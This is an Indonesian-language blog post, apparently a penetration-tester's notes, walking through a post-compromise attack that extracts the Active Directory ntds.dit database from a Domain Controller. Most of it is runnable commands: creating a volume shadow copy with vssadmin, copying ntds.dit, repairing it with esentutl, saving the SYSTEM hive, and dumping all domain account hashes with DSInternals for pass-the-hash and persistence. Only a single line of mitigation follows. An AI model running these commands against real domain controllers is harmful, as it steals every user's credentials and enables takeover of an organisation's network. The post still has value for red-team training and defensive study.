---
title: Ntds.dit Password Extraction
date: 2022-03-09 23:35:22 +0700
categories: [Active Directory, Post Compromise Attack]
tags: [active directory, windows, ntds.dit, persistence, vssadmin, mimikatz, powersploit, dsinternals]     # TAG names should always be lowercase
author: nairpaa
---

Semua data Active Directory disimpan di dalam file **ntds.dit** (secara default terletak di **C:\Windows\NTDS\\**) pada setiap Domain Controller. Di antara jenis informasi lainnya, file **.dit** tersebut berisi akun user beserta hash-nya. 

Untuk mendapatkan file **ntds.dit**, penyerang harus bisa mengakses Domain Controller dengan hak administratif. Atau, penyerang dapat mendapatkan file backup-nya yang ter-*leak*.

Setelah itu, penyerang bisa mendekripsi file tersebut dan memanfaatkannya untuk melakukan **Pass-Attack**.

### Tujuan 

- *Persistence*, atau
- *Privilege escalation* melalui [SeBackupPrivilege](/posts/sebackupprivilege-abuse/)

### Prasyarat

- Penyerang memiliki akses ke DC (administratif)

### Tools

- VSSAdmin
- Mimikatz
- PowerSploit
- [DSInternals](https://github.com/MichaelGrafnetter/DSInternals)

## Tahap Eksploitasi

### Step 1: Copy file ntds.dit

> Lokasi default **NTDS.dit** di **C:\Windows\NTDS\ntds.dit**
{: .prompt-note }

```powershell
# Tentukan direktori penyimpanan sementara
CMD > mkdir c:\Temp

# Buat Volume Shadow Copies, karena file yang sedang terbuka/digunakan tidak dapat di-copy
CMD > vssadmin create shadow /for=C:
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {7706ac7e-79af-4ccd-ab21-b0939fa46288}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
	
# Copy ntds.dit ke direktori penyimpanan sementara
CMD > copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit c:\Temp\ntds.dit

# Jalankan perintah berikut agar tidak terjadi error "The database is not in a clean state" pada saat melakukan dekripsi
CMD > ESENTUTL /p C:\temp\ntds.dit /!10240 /8 /o
```

### Step 2: Dapatkan SYSTEM hive

```powershell 
CMD > reg SAVE HKLM\SYSTEM c:\Temp\SYS
```


### Step 3: Dekripsi file ntds.dit

```powershell
PS > $key = Get-BootKey -SystemHiveFilePath .\SYS
PS > Get-ADDBAccount -All -BootKey $key -DBPath .\ntds.dit
```

![Dekripsi ntds.dit](/assets/img/posts/ndtsdit-password-extraction/1.png)

## Mitigasi

Lakukan pencegahan serangan Active Directory, seperti tidak menggunakan Domain Admins pada komputer user.

---

## Referensi

- https://attack.stealthbits.com/ntds-dit-security-active-directory
- https://www.youtube.com/watch?v=QfQVtTX-mDM